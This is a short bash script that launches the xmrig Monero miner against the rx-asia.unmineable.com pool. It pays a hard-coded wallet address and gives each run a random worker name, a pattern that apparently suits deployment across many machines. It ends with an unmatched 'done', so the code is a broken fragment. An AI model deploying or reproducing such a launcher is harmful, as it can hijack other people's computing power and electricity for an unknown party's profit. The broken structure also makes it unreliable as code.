#!/bin/bash


chmod +x xmrig
randomName=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 13 ; echo '')

./xmrig -o rx-asia.unmineable.com:3333 -u XMR:83oRwH1fxVYCSy9cCr1KTKDkDUThmXmgDL8xVFxkJUaScFPUSuFZpQdTejc3nNxt8LiBfvV7hJcV5Xh3spSEFQPjMczMEgh.YM45-$randomName -k -a rx/0


done
